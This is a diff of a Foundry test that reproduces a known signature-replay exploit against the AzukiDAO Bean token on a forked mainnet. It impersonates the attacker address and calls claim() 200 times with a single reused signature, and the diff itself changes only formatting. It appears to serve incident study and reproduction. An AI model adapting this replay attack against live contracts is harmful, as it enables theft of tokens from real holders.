@@ -26,16 +26,14 @@ interface IBean is IERC20 {
 contract AzukiTest is Test {
     IERC20 AZUKI = IERC20(0xED5AF388653567Af2F388E6224dC7C4b3241C544);
     IBean Bean = IBean(0x8189AFBE7b0e81daE735EF027cd31371b3974FeB);
-    address private constant Elemental =
-        0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e;
+    address private constant Elemental = 0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e;
     address private constant Beanz = 0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949;
-    address private constant azukiDAOExploiter =
-        0x85D231C204B82915c909A05847CCa8557164c75e;
+    address private constant azukiDAOExploiter = 0x85D231C204B82915c909A05847CCa8557164c75e;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 17593308);
+        cheats.createSelectFork("mainnet", 17_593_308);
         cheats.label(address(AZUKI), "AZUKI");
         cheats.label(address(Bean), "Bean");
         cheats.label(Elemental, "Elemental");
@@ -46,10 +44,8 @@ contract AzukiTest is Test {
     function testExploit() public {
         deal(address(Bean), azukiDAOExploiter, 0);
         emit log_named_decimal_uint(
-            "Attacker balance of Bean token before exploit",
-            Bean.balanceOf(azukiDAOExploiter),
-            Bean.decimals()
-        );
+            "Attacker balance of Bean token before exploit", Bean.balanceOf(azukiDAOExploiter), Bean.decimals()
+            );
         // Arguments for the claim() function calls
         // Signature: sender + contracts + tokenIds + claimAmount + endTime
         bytes32 r = 0xd044373fa377c3af4a854829176d14eebc23d96c342401b294f3491f0616559c;
@@ -67,7 +63,7 @@ contract AzukiTest is Test {
         amounts[1] = 0;
         amounts[2] = 0;
         uint256[] memory tokenIds = new uint256[](1);
-        tokenIds[0] = 3_748;
+        tokenIds[0] = 3748;
         vm.startPrank(azukiDAOExploiter);
         // Call claim() 200 times with the same signature. Invalid signature check in Bean token contract.
         // More iterations possible.
@@ -84,9 +80,7 @@ contract AzukiTest is Test {
         vm.stopPrank();
 
         emit log_named_decimal_uint(
-            "Attacker balance of Bean token after exploit",
-            Bean.balanceOf(azukiDAOExploiter),
-            Bean.decimals()
-        );
+            "Attacker balance of Bean token after exploit", Bean.balanceOf(azukiDAOExploiter), Bean.decimals()
+            );
     }
 }
